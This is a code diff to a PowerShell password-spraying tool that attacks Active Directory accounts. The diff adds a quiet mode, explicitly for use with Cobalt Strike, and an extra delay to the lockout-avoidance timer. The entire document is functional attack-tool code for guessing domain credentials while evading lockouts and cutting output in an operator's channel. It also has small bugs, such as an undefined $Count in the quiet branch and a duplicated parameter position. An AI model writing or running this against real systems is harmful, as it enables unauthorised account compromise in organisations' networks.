@@ -42,6 +42,14 @@ function Invoke-DomainPasswordSpray{
 
     Forces the spray to continue and doesn't prompt for confirmation.
 
+    .PARAMETER Fudge
+
+    Extra wait time between each round of tests (seconds).
+
+    .PARAMETER Quiet
+
+    Less output so it will work better with things like Cobalt Strike
+
     .PARAMETER UsernameAsPassword
 
     For each user, will try that user's name as their password
@@ -109,8 +117,15 @@ function Invoke-DomainPasswordSpray{
      $Delay=0,
 
      [Parameter(Position = 9, Mandatory = $false)]
-     $Jitter=0
+     $Jitter=0,
 
+     [Parameter(Position = 10, Mandatory = $false)]
+     [switch]
+     $Quiet,
+
+     [Parameter(Position = 11, Mandatory = $false)]
+     [int]
+     $Fudge=10
     )
 
     if ($Password)
@@ -213,16 +228,16 @@ function Invoke-DomainPasswordSpray{
 
     if($UsernameAsPassword)
     {
-        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
     }
     else
     {
         for($i = 0; $i -lt $Passwords.count; $i++)
         {
-            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter
+            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
             if (($i+1) -lt $Passwords.count)
             {
-                Countdown-Timer -Seconds (60*$observation_window)
+                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet
             }
         }
     }
@@ -238,14 +253,21 @@ function Countdown-Timer
 {
     param(
         $Seconds = 1800,
-        $Message = "[*] Pausing to avoid account lockout."
+        $Message = "[*] Pausing to avoid account lockout.",
+        [switch] $Quiet = $False
     )
-    foreach ($Count in (1..$Seconds))
+    if ($quiet)
     {
-        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
-        Start-Sleep -Seconds 1
+        Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
+        Start-Sleep -Seconds $Seconds
+    } else {
+        foreach ($Count in (1..$Seconds))
+        {
+            Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
+            Start-Sleep -Seconds 1
+        }
+        Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
     }
-    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
 function Get-DomainUserList
@@ -497,13 +519,19 @@ function Invoke-SpraySinglePassword
             $Jitter=0,
             [Parameter(Position=7)]
             [switch]
-            $UsernameAsPassword
+            $UsernameAsPassword,
+            [Parameter(Position=7)]
+            [switch]
+            $Quiet
     )
     $time = Get-Date
     $count = $UserListArray.count
     Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
-    Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
+    if ($OutFile -ne ""-and -not $Quiet)
+    {
+        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
+    }
     $RandNo = New-Object System.Random
 
     foreach ($User in $UserListArray)
@@ -522,7 +550,10 @@ function Invoke-SpraySinglePassword
             Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
         }
         $curr_user += 1
-        Write-Host -nonewline "$curr_user of $count users tested`r"
+        if (-not $Quiet)
+        {
+            Write-Host -nonewline "$curr_user of $count users tested`r"
+        }
         if ($Delay)
         {
             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
